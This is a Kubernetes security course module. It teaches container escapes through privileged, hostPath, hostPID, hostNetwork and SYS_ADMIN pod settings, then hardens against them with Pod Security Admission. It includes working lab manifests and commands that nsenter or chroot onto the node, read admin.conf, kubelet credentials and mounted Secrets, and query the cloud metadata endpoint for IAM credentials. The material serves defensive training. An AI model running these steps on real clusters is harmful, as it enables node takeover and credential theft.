# Container Escapes & Node Compromise

> **Module 05 · Course 03** — Every module so far assumed the blast radius ended at the pod. This one is where that assumption dies. A container is not a security boundary the way a VM is — it is a set of Linux namespaces and cgroups that the kernel will cheerfully hand back the moment a pod spec asks nicely. Here we ask nicely: `privileged`, `hostPath: /`, `hostPID`, `hostNetwork`, `CAP_SYS_ADMIN`. Each one turns "I have a shell in a pod" into "I am root on the node, reading every other tenant's secrets and the node's kubeconfig." Then we install the one admission control that refuses all of it: Pod Security Admission `restricted`.

You run Kubernetes at work, so you know a container shares the host kernel. What separates an operator from a defender is knowing *which specific pod-spec fields* dissolve the isolation, how to spot them in a running cluster, and how to write a policy that makes them un-schedulable. On your kind cluster the stakes are literal: Module 01 warned that "node = container on your host kernel," so an escape here lands you on the Mac, not in a throwaway VM. That is exactly why this is the last and most dangerous link in the chain.

---

## Why a container is not a VM

A container is your process, running on the host kernel, with a few things *hidden* from it:

```
┌───────────────────── the host kernel (shared) ─────────────────────┐
│                                                                     │
│   a "container" = your process + these isolations layered on:       │
│     • namespaces  (pid, net, mnt, uts, ipc, user) → what you SEE    │
│     • cgroups                                      → what you USE    │
│     • capabilities                                 → what you MAY DO │
│     • seccomp / AppArmor / SELinux                 → which syscalls  │
│                                                                     │
│   remove ANY of these and the process sees/uses/does more of the    │
│   host. `privileged: true` removes essentially all of them at once. │
└─────────────────────────────────────────────────────────────────────┘
```

A VM has its own kernel and a hardware-enforced boundary; escaping it means a hypervisor bug. A container's boundary is *policy the kernel applies to a normal process* — and a pod spec can ask the kernel to apply less of it. No exploit required. The "escapes" below are not CVEs; they are **features**, used as designed, by a pod that should never have been allowed to request them.

| What the pod requests | What isolation it removes | What the attacker gains |
|-----------------------|---------------------------|-------------------------|
| `privileged: true` | caps, device cgroup, many LSM hooks | Effectively root on the node |
| `hostPath: { path: / }` | mount-namespace isolation of the host FS | Read/write the entire node filesystem |
| `hostPID: true` | PID-namespace isolation | See + `nsenter` into host processes (incl. PID 1) |
| `hostNetwork: true` | network-namespace isolation | Node's interfaces, `localhost` services, cloud metadata |
| `CAP_SYS_ADMIN` | the "new root" capability | mount, pivot_root, many escape primitives |

---

## Escape 1 — the `hostPath: /` mount (read the whole node)

The simplest escape needs no privilege flag at all: mount the host's root filesystem into the pod. If admission lets this pod exist, the container can read — and write — every file on the node.

```yaml
# lab-only: a pod that mounts the node's entire root filesystem read-write
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-escape
  namespace: dojo-escape
spec:
  containers:
    - name: tool
      image: alpine:3.20
      command: ["sh", "-c", "sleep 3600"]
      volumeMounts:
        - name: host
          mountPath: /host          # the node's / is now the pod's /host
  volumes:
    - name: host
      hostPath:
        path: /
        type: Directory
```

Once it's running, the node's filesystem is under `/host`:

```bash
kubectl -n dojo-escape exec -it hostpath-escape -- sh
# inside the pod:
ls /host/etc/kubernetes                       # the node's kube configs
cat /host/etc/kubernetes/admin.conf 2>/dev/null   # on a control-plane node: cluster-admin kubeconfig
ls /host/var/lib/kubelet/pods                 # every pod's mounted Secrets, in the clear
```

That last line is the quiet catastrophe: `/var/lib/kubelet/pods/**/volumes/kubernetes.io~secret/` holds the **decrypted** contents of every Secret mounted into every pod on that node — encryption-at-rest (Module 04) protects etcd, not the kubelet's tmpfs. A single `hostPath: /` pod reads all of them.

### Defense — no `hostPath`, and a `chroot` shows why it's total

To make the escape's completeness obvious: with the host FS mounted, you can `chroot` into it and *become* a shell on the node, with the node's binaries and config, as if the container never existed.

```bash
# inside the hostPath pod — now you are operating as the node itself
chroot /host /bin/sh
cat /etc/kubernetes/kubelet.conf              # node identity: system:node:<nodename>
```

The defense is categorical: **workloads do not get `hostPath`.** PSA `restricted` (below) forbids it outright. Where a genuine need exists (a node-exporter, a CSI driver), scope the `hostPath` to the one subdirectory required with `type: Directory`/`File`, mount `readOnly: true`, and run it from a dedicated, policy-exempt namespace — never `/`, never read-write, never from an app namespace.

---

## Escape 2 — the `privileged` container + `hostPID` (become PID 1's neighbor)

`privileged: true` is the blunt instrument: it hands the container nearly all capabilities, the device cgroup (so `/dev` is the host's devices), and drops most of the LSM confinement. Pair it with `hostPID: true` and the container shares the host process table — including PID 1 — and the classic move is to `nsenter` into init's namespaces and simply *be* the host.

```yaml
# lab-only: the "I am the node" pod
apiVersion: v1
kind: Pod
metadata:
  name: priv-escape
  namespace: dojo-escape
spec:
  hostPID: true                 # share the host PID namespace
  containers:
    - name: tool
      image: alpine:3.20
      command: ["sh", "-c", "sleep 3600"]
      securityContext:
        privileged: true        # ~all caps, host devices, minimal confinement
```

```bash
kubectl -n dojo-escape exec -it priv-escape -- sh
# inside: enter the host's mount/uts/ipc/net/pid namespaces of PID 1
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# you now have a root shell in the HOST's namespaces — ps shows every host process
ps aux | head
cat /etc/kubernetes/admin.conf 2>/dev/null
```

`nsenter --target 1 ...` says "run this shell inside PID 1's namespaces." Because `hostPID` made PID 1 visible and `privileged` gave the capabilities to join its namespaces, you land in the node's own mount and network view — the escape is complete without touching a single CVE.

> **Why `privileged` is worse than it looks:** it is not one switch, it is a bundle — `allowPrivilegeEscalation: true`, all capabilities, `/dev` from the host, no seccomp filter, read-write `/sys` and `/proc`. Each is independently dangerous; together they are game over. There is almost never a legitimate reason for an *application* pod to be privileged. When you find one in a manifest review, treat it as a finding, not a convenience.

### Defense — drop the two flags, and the capability behind them

```yaml
securityContext:
  privileged: false
  allowPrivilegeEscalation: false
  capabilities:
    drop: ["ALL"]          # start from zero, add back only what's provably needed
# and at the pod level: hostPID: false  (the default — never set it true for apps)
```

Dropping `ALL` capabilities and refusing privilege escalation removes the primitives `nsenter`/`mount`/`chroot` need. `hostPID: false` (the default) keeps PID 1 out of view so there's nothing to `nsenter` into.

---

## Escape 3 — `CAP_SYS_ADMIN` without full privilege (the "almost root" cap)

Teams that know `privileged: true` is bad sometimes reach for "just one capability" — and reach for `SYS_ADMIN`, which is the single most powerful one. It grants `mount`, `pivot_root`, and a long tail of operations that are escape primitives in their own right. Adding it is, for practical attack purposes, close to privileged.

```yaml
# lab-only: looks "minimal", is nearly privileged
securityContext:
  capabilities:
    add: ["SYS_ADMIN"]       # mount(), pivot_root(), and a dozen escape paths
```

Inspect what you actually got from inside the pod:

```bash
kubectl -n dojo-escape exec -it <pod> -- sh -c 'apk add -q libcap 2>/dev/null; capsh --print 2>/dev/null | grep -i sys_admin'
# or straight from the kernel, no tools needed:
kubectl -n dojo-escape exec -it <pod> -- cat /proc/1/status | grep -i Cap
```

The capability is also visible — and auditable — in the raw `/proc/<pid>/status` `CapEff` bitmask, which is how a defender confirms what a container *effectively* holds regardless of what the YAML claims.

### Defense — add capabilities by name, never `SYS_ADMIN` to an app

If a workload genuinely needs one capability (e.g. `NET_BIND_SERVICE` to bind port 80 as non-root), add exactly that and nothing else, on top of `drop: ["ALL"]`:

```yaml
securityContext:
  capabilities:
    drop: ["ALL"]
    add: ["NET_BIND_SERVICE"]   # the whole list, by name — SYS_ADMIN is never on it for an app
```

---

## Escape 4 — `hostNetwork` (the node's network identity)

`hostNetwork: true` drops the pod into the node's network namespace. The pod now sees the node's interfaces, can bind the node's ports, reach services bound to the node's `localhost`, and — on a cloud node — hit the metadata endpoint `169.254.169.254` to steal the node's IAM credentials (the Cloud layer from Module 01).

```bash
# inside a hostNetwork pod on a cloud node (illustrative — kind has no metadata svc):
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/   # node IAM role
# and localhost services the node never meant to expose cluster-wide:
curl -s http://127.0.0.1:10255/pods                                         # read-only kubelet port, if on
```

### Defense — `hostNetwork: false` and NetworkPolicy egress

Keep `hostNetwork` off (the default) so the pod has its own network namespace. Layer a NetworkPolicy that denies egress to the metadata IP and the node's kubelet ports, so even a misconfigured pod can't reach them:

```yaml
# deny egress to the cloud metadata endpoint for all pods in the namespace
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-metadata-egress
  namespace: dojo-escape
spec:
  podSelector: {}
  policyTypes: ["Egress"]
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except: ["169.254.169.254/32"]   # block the metadata service specifically
```

---

## Stealing the node's kubeconfig — turning a node breach into a cluster breach

The reason any of the above matters beyond one node: the node's filesystem holds credentials that are *more* privileged than the pod ever was. Once you're reading the host FS (Escape 1) or standing in PID 1's namespaces (Escape 2), you harvest them:

```bash
# on a worker node — the kubelet's own client credential (identity: system:node:<name>)
cat /host/etc/kubernetes/kubelet.conf
ls  /host/var/lib/kubelet/pki/                 # kubelet client cert/key

# on a control-plane node — the jackpot: a cluster-admin kubeconfig
cat /host/etc/kubernetes/admin.conf
```

`admin.conf` is `cluster-admin`. A single `hostPath: /` pod that lands on a control-plane node escalates from "code in a container" to "owner of the entire cluster" in one `cat`. On your kind cluster, `docker exec dojo-control-plane cat /etc/kubernetes/admin.conf` is the same credential the escape would hand an attacker — that's why control-plane nodes must never schedule untrusted workloads (the default `node-role.kubernetes.io/control-plane:NoSchedule` taint exists for exactly this).

---

## The one control that stops all four: Pod Security Admission `restricted`

PSA is built into the API server. You label a namespace and the admission controller **rejects** any pod that violates the profile at creation time — no sidecar, no webhook to deploy. `restricted` is the profile that forbids every field used above.

```bash
# enforce the strictest profile; also warn/audit so you see violations in output + audit log
kubectl label ns dojo-escape \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/warn=restricted \
  pod-security.kubernetes.io/audit=restricted --overwrite
```

Now re-apply any escape pod from this module and watch admission refuse it:

```bash
kubectl -n dojo-escape apply -f priv-escape.yaml
# Error from server (Forbidden): pods "priv-escape" is forbidden: violates PodSecurity
# "restricted:latest": privileged (container "tool" must not set securityContext.privileged=true),
# hostPID (pod must not set spec.hostPID=true), allowPrivilegeEscalation != false,
# unrestricted capabilities (must drop "ALL"), seccompProfile (must be "RuntimeDefault" or "Localhost")
```

A pod that actually satisfies `restricted` looks like this — and this is the shape every app pod should have:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: compliant
  namespace: dojo-escape
spec:
  securityContext:
    runAsNonRoot: true
    seccompProfile:
      type: RuntimeDefault          # kernel syscall filter on by default
  containers:
    - name: app
      image: alpine:3.20
      command: ["sh", "-c", "sleep 3600"]
      securityContext:
        allowPrivilegeEscalation: false
        privileged: false
        readOnlyRootFilesystem: true
        runAsNonRoot: true
        capabilities:
          drop: ["ALL"]
```

| Control | Which escape it kills |
|---------|-----------------------|
| `privileged: false` + `drop: ["ALL"]` | Escapes 2 & 3 (no caps for `nsenter`/`mount`/`chroot`) |
| No `hostPath` (forbidden by `restricted`) | Escape 1 (can't mount the node FS) |
| `hostPID`/`hostNetwork` forbidden | Escapes 2 & 4 (no host PID/net namespace) |
| `seccompProfile: RuntimeDefault` | narrows the syscall surface for any residual exploit |
| `readOnlyRootFilesystem` + `runAsNonRoot` | removes write-anywhere and root-in-container footholds |
| **seccomp / AppArmor** profiles | block the specific syscalls (e.g. `mount`, `ptrace`) an escape needs |

For policy you need beyond PSA's three fixed profiles — "no `:latest` tags", "images only from our registry", custom exceptions — layer **Kyverno** or **OPA/Gatekeeper**. PSA is the floor; admission policy engines are the walls.

---

## Debugging & recon of a pod's securityContext

Whether you're hunting for an escape-capable pod or confirming your hardening took, you inspect the same fields. Work this table when a pod "shouldn't be able to do that" — or when `restricted` rejects a pod you think is clean.

| Symptom | Likely cause | Fix |
|---------|--------------|-----|
| Pod can read `/host/...` or node files | A `hostPath` volume (often `/`) slipped through | Remove the volume; enforce `restricted`; audit with the jsonpath below |
| `nsenter`/`mount`/`chroot` works inside a pod | `privileged: true` or `CAP_SYS_ADMIN` granted | `drop: ["ALL"]`, `privileged: false`, `allowPrivilegeEscalation: false` |
| Pod sees host processes in `ps` | `hostPID: true` | Set `hostPID: false` (default); re-deploy |
| Pod reaches `169.254.169.254` / node `localhost` | `hostNetwork: true`, or no egress policy | `hostNetwork: false` + deny-metadata NetworkPolicy |
| `restricted` rejects a pod you think is compliant | missing `seccompProfile`, `runAsNonRoot`, or caps not dropped | read the Forbidden message — it names the exact field; add it |
| Hardening "applied" but escape still works | label on the namespace is `warn`/`audit` only, not `enforce` | set `pod-security.kubernetes.io/enforce=restricted` |

### Diagnose each — the exact commands

**Audit every pod's dangerous fields in one pass** (no jq — pure jsonpath):

```bash
# any pod requesting privilege, host namespaces, or hostPath across the cluster
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"/"}{.metadata.name}{"  priv="}{.spec.containers[*].securityContext.privileged}{"  hostPID="}{.spec.hostPID}{"  hostNet="}{.spec.hostNetwork}{"\n"}{end}'

# which pods mount a hostPath, and to what path:
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"/"}{.metadata.name}{" -> "}{.spec.volumes[*].hostPath.path}{"\n"}{end}' | grep -v ' -> $'
```

**Confirm a container's *effective* capabilities** from the kernel, not the YAML (the YAML can lie if something mutated it):

```bash
kubectl -n dojo-escape exec <pod> -- cat /proc/1/status | grep -iE 'Cap(Eff|Prm|Bnd)'
# decode a CapEff bitmask on a box that has capsh:
# capsh --decode=00000000a80425fb
```

**Prove PSA is enforcing, not just warning:**

```bash
kubectl get ns dojo-escape -o jsonpath='{.metadata.labels}' ; echo
# look for pod-security.kubernetes.io/enforce=restricted — warn/audit alone block nothing
```

**Dry-run a manifest against the policy before you ship it:**

```bash
kubectl label ns dojo-escape pod-security.kubernetes.io/enforce=restricted --overwrite
kubectl -n dojo-escape apply --dry-run=server -f mypod.yaml   # server-side = runs admission
```

> **War story.** A monitoring agent on one of our kind-based CI clusters at SAP needed to read the host's cgroup stats, so someone shipped it with `hostPath: /` mounted read-write "temporarily" and a `privileged: true` to make the mount errors go away. It passed review because the agent "only reads metrics." Months later a dependency in that agent's image had a known RCE. Because node = container on the CI runner, a crafted request would have given code execution a read-write mount of the runner's root filesystem and, two directories over, every other job's mounted Secrets in `/var/lib/kubelet/pods`. We hadn't been breached — a scheduled image scan caught the CVE first — but the postmortem was blunt: the exposure was never the CVE, it was that a metrics agent was allowed to request `privileged` + `hostPath: /` at all. The fix was one namespace label (`enforce=restricted`) plus a `hostPath` scoped to the single read-only cgroup directory the agent actually needed. The lesson I keep: *harden the admission policy, not the individual pod* — the pod you forget to review is the one that gets you.

---

## Checkpoint

You're ready for the course's hardening challenges when you can, without looking anything up:

1. Explain why a container is not a VM in terms of namespaces, cgroups, capabilities, and LSMs — and why these "escapes" need no CVE.
2. Write a `hostPath: /` pod, read a node file through it, and `chroot` onto the host; then name the kubelet directory that leaks every pod's decrypted Secrets.
3. Combine `privileged: true` + `hostPID: true` and `nsenter --target 1` into PID 1's namespaces, and say what each flag contributed.
4. State why `CAP_SYS_ADMIN` is "almost privileged," and read a container's effective caps from `/proc/1/status`.
5. Describe what `hostNetwork: true` exposes (node interfaces, `localhost` services, `169.254.169.254`) and the NetworkPolicy that blocks the metadata endpoint.
6. Explain how a `hostPath: /` pod on a control-plane node becomes `cluster-admin` via `admin.conf`, and why control-plane nodes are tainted `NoSchedule`.
7. Label a namespace `pod-security.kubernetes.io/enforce=restricted`, predict which escape pods it rejects, and write a pod that actually satisfies `restricted`.
8. Audit every pod's `privileged`/`hostPID`/`hostNetwork`/`hostPath` across a cluster with one jsonpath query, and tell `enforce` from `warn`/`audit`.
9. Say why hardening the admission policy beats hardening individual pods, and where Kyverno/OPA pick up what PSA's fixed profiles can't express.

➡ Next up: the course's **Attack & Defend challenges** — you'll escape a deliberately misconfigured pod to recover a flag off the node, then flip the namespace to `restricted` and prove the same escape becomes un-schedulable. Offense to place the control, defense to break the chain.
